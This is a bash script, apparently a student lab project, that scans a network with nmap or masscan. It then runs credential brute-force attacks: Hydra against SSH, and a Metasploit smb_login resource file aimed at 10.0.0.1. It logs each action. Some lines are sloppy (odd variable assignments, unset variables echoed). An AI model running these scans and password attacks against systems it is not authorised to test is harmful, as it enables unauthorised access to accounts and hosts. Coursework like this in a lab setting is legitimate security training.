#!/bin/bash

# Name the function as downloads1
# Follow the basic format of function as seen below
# Always remember to call the function in the last line
# Use sudo apt-get install command to download the tools/applications required for the computer
# Applications to be downloaded for the script: masscan, nmap
# Run the command as seen below to download the applications

function downloads1()
{
      
   sudo apt-get install masscan nmap
   echo '----------------------Downloads are successful. All ready to go.----------------------'
	
}
downloads1	

echo

# In this project, I am required to use Case in the script to give user various options to choose and run the commands in each option 
# The structure of my script is giving the user 2 options, of which both are potential attacks
# Following the structure of Case, I call out the message that will prompt the user to select an option
# Using the commands that I learnt from bash scripting, I use echo and variable to run the script
# The use of variables allows for any input to still let the script run smoothly
# In this option, the variable input is the user's network/ipaddress that will be scanned using either Nmap or Masscan
# As a requirement for this project, all scans is required to be logged
# I use printf command to display the information required to be in the log file and append into the filename: log_file.txt

read -p "Hello, Welcome to Cybersecurity. To start, please choose A or B to proceed." choices
case $choices in

    A) echo "Enter your network to scan:"
       read network
       echo '**Network is scanned via Nmap**'
       scan1= sudo nmap $network -oG nmap.scan
       echo "----------------Network is scanned----------------"	
       printf "$(date): $(whoami): Nmap: $network \n" >> log_file.txt						
    ;;
    
    B) echo "Enter your network to scan:"
       read network
       echo '**Network is scanned via Masscan**'
       scan2= sudo masscan $network -p 20-80
       echo "----------------Network is scanned----------------"
       printf "$(date): $(whoami): Masscan: $network \n" >> log_file.txt	
    ;;
    esac
    
echo    
 
# The second Case in the script is give the user 2 options of attack 
# The idea is to run the script similar to how a scam works in today's digital world with the messaging appearing harmless
# In the first option, the attack used is using Hydra, where the user will in put his user name and password
# In Hydra, I need the username, password list, ipaddress and the service to run 
# Similar to the Case above, I append the attack results into the filename: attack1results.txt
# Once the attack is completed, the user will see a message: You are attacked
# I use printf command to display the information required to be in the log file and append into the filename: log_file.txt
# In this section, I use Case within a Case as I want to allow the user to choose between viewing the attack results file or the log file
# Since the files are saved in a certain directory, I have specified the path in the options to allow the user to open either files
# In the second option, I run msfconsole for smb login attack
# In this attack, I specify using use auxiliary/scanner/smb/smb_login and set the rhosts, user_file, pass_file and I append into a resource file that is required for msfconsole command
# To save the output of the attack, I use the output command, -o and specify the filename the output needs to be stored: smb_login_results.txt
# I use printf command to display the information required to be in the log file and append into the filename: log_file.txt
# In this section, I use Case within a Case as I want to allow the user to choose between viewing the attack results file or the log file
    
read -p "All is clear. Press A or B to proceed." choices1
case $choices1 in

     A) echo "Enter your username: $username"
        read username
        echo "Enter your password: $password" 
        read password
        echo "Enter your network: $ip"
        read ip
        attack1= sudo hydra -l $username -P pass.lst $ip ssh -t 4 -vV >> attack1results.txt 
        echo "You are attacked"
        printf "$(date): $(whoami): $username: Hydra: $ip \n" >> log_file.txt
        
        read -p "Choose A to view the attack results or B to view the attack log file. A or B." choices2
        case $choices2 in
            
            A) cat /home/fathiahabdul/attack1results.txt
            ;;
            
            B) cat /home/fathiahabdul/log_file.txt
              
            ;;
            esac
           
     ;;
     
     B) echo 'use auxiliary/scanner/smb/smb_login' > smb_login_enum.rc
        echo 'set rhosts 10.0.0.1' >> smb_login_enum.rc
        echo 'set user_file user.lst' >> smb_login_enum.rc
        echo 'set pass_file pass.lst' >> smb_login_enum.rc
        echo 'run' >> smb_login_enum.rc
        echo 'exit' >> smb_login_enum.rc
        printf "$(date): $(whoami): SMB_LOGIN: 10.0.0.1 \n" >> log_file.txt
       
        msfconsole -r smb_login_enum.rc -o smb_login_results.txt
        echo "You are attacked"
        
        read -p "Choose A to view the attack results or B to view the attack log file. A or B." choices3
        case $choices3 in
            
            A) cat /home/fathiahabdul/smb_login_results.txt
            ;;
            
            B) cat /home/fathiahabdul/log_file.txt
            
            ;;
            esac
  

     ;;
     esac   
            
# Reference list -
# Nmap: https://auth.geeksforgeeks.org/roadBlock_v2.php, https://www.notion.so/cfcapac/Network-Research-e49670761fc04fdf9a1468b98154e5d1#e9062d7c2d514e1d96e8a535533157fd
# Masscan: https://www.kali.org/tools/masscan/, https://www.notion.so/cfcapac/Network-Research-e49670761fc04fdf9a1468b98154e5d1#e9062d7c2d514e1d96e8a535533157fd
# MSFConsole Installation: https://www.fosslinux.com/48112/install-metasploit-kali-linux.htm
# Write Output of Bash Command to Log File: https://www.tutorialkart.com/bash-shell-scripting/write-output-of-bash-command-to-log-file-example/
# Functions: https://www.geeksforgeeks.org/bash-scripting-functions/, https://www.notion.so/cfcapac/Network-Research-e49670761fc04fdf9a1468b98154e5d1#49e6e0f7d1a545e4be1b640caf93a515
    
       
      
       
